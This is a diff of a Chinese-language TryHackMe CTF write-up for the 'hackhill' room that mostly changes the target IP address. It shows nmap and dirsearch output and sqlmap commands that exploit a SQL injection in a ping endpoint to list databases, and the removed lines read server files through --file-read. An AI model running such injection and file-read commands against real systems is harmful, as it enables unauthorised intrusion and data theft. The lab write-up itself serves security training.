@@ -129,10 +129,10 @@ bash-4.4# cat /root/root.txt
 
 ```
 ┌──(root💀kali)-[~/tryhackme/hackhill]
-└─# nmap -sV -Pn 10.10.252.128                                                                                                                                                                                                         130 ⨯
+└─# nmap -sV -Pn 10.10.2.131                                                                                                                                                                                                         130 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 10:00 EDT
-Nmap scan report for 10.10.252.128
+Nmap scan report for 10.10.2.131
 Host is up (0.32s latency).
 Not shown: 985 filtered ports
 PORT     STATE SERVICE       VERSION
@@ -160,18 +160,18 @@ PORT     STATE SERVICE       VERSION
 # 80
 ```
 ┌──(root💀kali)-[~/tryhackme/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.252.128
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.2.131
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
 
-Output File: /root/tryhackme/dirsearch/reports/10.10.252.128/_21-10-25_10-10-52.txt
+Output File: /root/tryhackme/dirsearch/reports/10.10.2.131/_21-10-25_10-10-52.txt
 
 Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-25_10-10-52.log
 
-Target: http://10.10.252.128/
+Target: http://10.10.2.131/
 
 [10:10:53] Starting: 
 [10:11:00] 200 -    2KB - /%3f/                                            
@@ -191,18 +191,18 @@ Target: http://10.10.252.128/
 # 81
 ```
 ┌──(root💀kali)-[~/tryhackme/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.252.128:81
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.2.131:81
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
 
-Output File: /root/tryhackme/dirsearch/reports/10.10.252.128-81/_21-10-25_10-27-15.txt
+Output File: /root/tryhackme/dirsearch/reports/10.10.2.131-81/_21-10-25_10-27-15.txt
 
 Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-25_10-27-15.log
 
-Target: http://10.10.252.128:81/
+Target: http://10.10.2.131:81/
 
 [10:27:16] Starting: 
 [10:27:22] 200 -    5KB - /%3f/                                            
@@ -216,18 +216,18 @@ Target: http://10.10.252.128:81/
 # 82
 ```
 ┌──(root💀kali)-[~/tryhackme/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.252.128:82
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.2.131:82
 
   _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                             
  (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
                                                                                                                                                                                                                                              
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
 
-Output File: /root/tryhackme/dirsearch/reports/10.10.252.128-82/_21-10-25_10-29-15.txt
+Output File: /root/tryhackme/dirsearch/reports/10.10.2.131-82/_21-10-25_10-29-15.txt
 
 Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-25_10-29-15.log
 
-Target: http://10.10.252.128:82/
+Target: http://10.10.2.131:82/
 
 [10:29:16] Starting: 
 [10:29:24] 403 -  312B  - /%2e%2e//google.com                              
@@ -258,13 +258,14 @@ Target: http://10.10.252.128:82/
 
 # 枚举数据库
 ```
-sqlmap -u "http://10.10.252.128:81/ping?id=6" -p "id"  --batch --dbms=mysql --technique B --dbs
+sqlmap -u "http://10.10.2.131:81/ping?id=6" -p "id"  --batch --dbms=mysql --technique B --dbs
 available databases [2]:
 [*] information_schema
 [*] networkmonitor
 
 ```
 
-# 枚举数据表
-sqlmap -u "http://10.10.252.128:81/ping?id=6" -p "id"  --batch --dbms=mysql --technique B --file-read="./index.php"
-sqlmap -u "http://10.10.252.128:81/ping?id=6" -p "id"  --batch --dbms=mysql --technique B --file-read="c:/www/html/serv2/index.php"
+# 其他信息
+>数据表：host 表字段：id,ip
+>用户名：'monitor_read'@'localhost'
+>密码：枚举不出来
